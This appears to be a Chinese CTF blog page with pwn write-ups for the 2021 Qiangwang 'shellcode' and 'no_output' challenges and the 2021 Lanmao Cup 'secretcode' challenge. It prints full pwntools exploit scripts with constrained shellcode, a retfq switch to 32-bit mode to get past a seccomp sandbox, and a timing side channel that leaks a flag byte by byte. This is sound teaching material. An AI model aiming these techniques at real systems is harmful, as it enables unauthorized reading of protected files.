<p>前面我们说过利用<code>push rdx;pop rdx;</code>来构造shellcode，因为执行shellcode时call的是rbx，所以可以用rbx作为基址找到这两条指令的位置。</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-3.jpg" class>

<p>接下来构造x86下的open、返回到64位的retfq、返回64位之后用来读出flag的read以及一部分用来侧信道攻击的code，要注意这部分shellcode并不会通过程序的检查，因为这部分是用我们调用的read写进去的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>到这里题目就基本完成了，最后爆破一下就行，完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ebx ecx edx esi edi ebp</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x30</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        p = process(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">        shellcode_blast = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            mov al,[rsi + %d]</span></span><br><span class="line"><span class="string">            cmp al,%d</span></span><br><span class="line"><span class="string">            loop:</span></span><br><span class="line"><span class="string">            ja loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>%(i,mid)</span><br><span class="line">        p.send(asm(payload))</span><br><span class="line">        sleep(<span class="number">0.25</span>)</span><br><span class="line">        p.send(asm(shellcode + shellcode_blast))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.recv(timeout = <span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">0.5</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        p.close()</span><br><span class="line">    flag += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>一点小问题是这里的<code>time.time() - start_time</code>的比较时间不能太短，否则会错</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/" class="post-title-link" itemprop="url">2021蓝帽杯决赛-secretcode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-09 16:40:11" itemprop="dateCreated datePublished" datetime="2022-03-09T16:40:11+08:00">2022-03-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-12 23:51:18" itemprop="dateModified" datetime="2022-03-12T23:51:18+08:00">2022-03-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h5 id="侧信道攻击的概念"><a href="#侧信道攻击的概念" class="headerlink" title="侧信道攻击的概念"></a>侧信道攻击的概念</h5><blockquote>
<p>侧信道信息一般分成：声音、温度、功耗、电磁、色彩、等，在加密硬件进行加密的时候，上述的信息只是加密过程中附带产生的物理量，这列物理量不会对加密提供任何好处，攻击利用收集到的这些物理信息，通过结合统计学手段，或者其他算法揭秘硬件上使用的秘钥。这些利用物理量达到破解秘钥的方法就叫做侧信道攻击。 </p>
</blockquote>
<p>我的理解是侧信道攻击就是通过对一些加密信息本身以外的信息来进行分析，从而得到我们想要的加密信息本身的攻击方式，这一块算是一些别的知识拓展，对做题本身而言没有帮助</p>
<h5 id="二分法算法"><a href="#二分法算法" class="headerlink" title="二分法算法"></a>二分法算法</h5><p>下面题目中的exp利用了二分法来缩短爆破的时间及次数，当然其实也可以用jz来遍历爆破，但我觉得是一种很棒的思路，结合下面题目来看</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>参考了wjh师傅的<a target="_blank" rel="noopener" href="http://wjh-blog.test.upcdn.net/archives/479/">第五届 “蓝帽杯” Final PWN、RE Writeup</a>，他用二分法来编写shellcode以此缩短爆破的时间和次数</p>
<p>保护如下</p>
<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/checksec.png" class>

<p>程序主逻辑</p>
<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/main.png" class>

<p>沙箱规则如下</p>
<img src="/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/seccomp.jpg" class>

<p>可见只能调用open和read，同时要求调用read时的文件描述符不小于14，所以我们没办法二次读入一段shellcode</p>
<p>综上我们就需要输入一段大小在 0x40 字节以内，且中间不包含’\x00’的shellcode，同时因为我们只能调用open和read，所以需要用侧信道攻击来得到flag</p>
<p>让open的返回值（rax）与 0x14 进行比较，不等于则继续open，直到fd不小于14后再进行read，将flag读到栈上，再根据ja指令来判断flag的某位（i）是否大于某个值（mid）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	open:</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi,rsp</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	push 0x2</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	cmp rax,0x14</span></span><br><span class="line"><span class="string">	jnz open</span></span><br><span class="line"><span class="string">	mov rdi,rax</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	mov dl,0xff</span></span><br><span class="line"><span class="string">	mov rsi,rsp</span></span><br><span class="line"><span class="string">	xor rax,rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov al,[rsp + %d]</span></span><br><span class="line"><span class="string">	cmp al,%d</span></span><br><span class="line"><span class="string">	loop:</span></span><br><span class="line"><span class="string">	ja loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (i,mid)</span><br></pre></td></tr></table></figure>

<p>这里设置loop是为了利用shellcode执行的时间来判断这段shellcode中是否进入了loop循环，如果进入了则说明此时比较的flag位大于mid，结合这部分我们再利用二分法来进行爆破就可以得出此时比较的flag位是什么，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x20</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">        p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">        shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			open:</span></span><br><span class="line"><span class="string">			push 0x67616c66</span></span><br><span class="line"><span class="string">			mov rdi,rsp</span></span><br><span class="line"><span class="string">			xor rsi,rsi</span></span><br><span class="line"><span class="string">			xor rdx,rdx</span></span><br><span class="line"><span class="string">			push 0x2</span></span><br><span class="line"><span class="string">			pop rax</span></span><br><span class="line"><span class="string">			syscall</span></span><br><span class="line"><span class="string">			cmp rax,0x14</span></span><br><span class="line"><span class="string">			jnz open</span></span><br><span class="line"><span class="string">			mov rdi,rax</span></span><br><span class="line"><span class="string">			xor rdx,rdx</span></span><br><span class="line"><span class="string">			mov dl,0xff</span></span><br><span class="line"><span class="string">			mov rsi,rsp</span></span><br><span class="line"><span class="string">			xor rax,rax</span></span><br><span class="line"><span class="string">			syscall</span></span><br><span class="line"><span class="string">			mov al,[rsp + %d]</span></span><br><span class="line"><span class="string">			cmp al,%d</span></span><br><span class="line"><span class="string">			loop:</span></span><br><span class="line"><span class="string">			ja loop</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span> % (i,mid)</span><br><span class="line">        p.send(shellcode)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.recv(timeout = <span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">0.05</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        p.close()</span><br><span class="line">    flag += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span> : <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我对于<code>p.recv(timeout = 0.01)</code>的理解：<code>p.recv()</code>用于接收程序的输出，但是如果程序没有输出的话正常情况下<code>p.recv()</code>就会造成阻塞，设置的<code>timeout</code>参数就是用来防止这个阻塞过久，超过设定的时间之后就会退出<code>p.recv()</code>，但是在这期间即便没有接收到输出也不会报错。</p>
<p>那么对于这题而言<code>p.recv(timeout = 0.1)</code>的作用就在于阻塞程序0.01秒，如果这0.01秒内程序还在运行的话，<code>p.recv()</code>则会正常退出，进入 if 处的判断，但如果这0.01秒内程序已经结束了，那么在<code>p.recv()</code>处脚本会报错，从而进入 except 中处理。结合<code>while True</code>就是利用<code>p.recv()</code>来判断在 <code>time.time() - start_time</code>期间程序是否还在运行，显然程序如果在执行shellcode时进入了loop循环，那么程序执行的时间会比较大，从而在某次while的循环中进入if中处理，但是如果程序直接挂掉了，那么脚本就进入except中处理。</p>
<p>以上部分属于个人理解，可能有些不准确，但是总体是没错的。算法部分很简单，简单理解下即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/" class="post-title-link" itemprop="url">2021强网-no_output</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-08 02:11:22 / 修改时间：17:56:12" itemprop="dateCreated datePublished" datetime="2022-03-08T02:11:22+08:00">2022-03-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h5 id="Off-By-One（栈）"><a href="#Off-By-One（栈）" class="headerlink" title="Off-By-One（栈）"></a>Off-By-One（栈）</h5><p>源字符串长度等于目标缓冲区长度时，将源字符串复制到目标缓冲区可能会导致off by one（1字节溢出）</p>
<p>比如strcpy函数在复制字符串时会拷贝结束符<code>\x00</code>，所以会发生如上所述的1字节溢出，将缓冲区的高一位覆盖成<code>\x00</code>。同样如下例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为strlen函数在计算字符串长度时并不计算结束符，所以strcpy函数对结束符的拷贝使得在chunk1处发生了1字节溢出</p>
<h5 id="SIGFPE信号"><a href="#SIGFPE信号" class="headerlink" title="SIGFPE信号"></a>SIGFPE信号</h5><p>“错误的算术操作”会使得SIGFPE信号被发送给进程，例如：整数除零、整数上溢、浮点除零、浮点上/下溢……</p>
<blockquote>
<p>一个通常的疏忽是认为除以零是SIGFPE的唯一来源。在一些架构上（包括IA-32[来源请求]），使用INT_MIN（最小的可以被表示的负整数值）除以-1的整数除法也会触发这个信号，因为商是一个无法被表示的正数。（比如8位有符号整数可以表示-128、+127和它们之间的整数。-128÷-1=+128 &gt; +127，因此无法被表示而产生溢出并触发此信号）</p>
</blockquote>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>保护</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/checksec.jpg" class>

<p>main函数</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/main.png" class>

<p>跟进</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049424.jpg" class>

<p>第一个函数中除了setbuf还open了远程的real_flag.txt，将返回的文件描述符放到了 .bss 段上</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_804930B.jpg" class>

<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/fd.jpg" class>

<p>sub_80493EC()函数没什么太大作用，跳过</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/cmp_func.png" class>

<p>接下来read函数从打开的real_flag.txt文件中读取10个字节并与 .data 段的字符串进行比较</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/data.png" class>

<p>相等则进入sub_8049269()函数。</p>
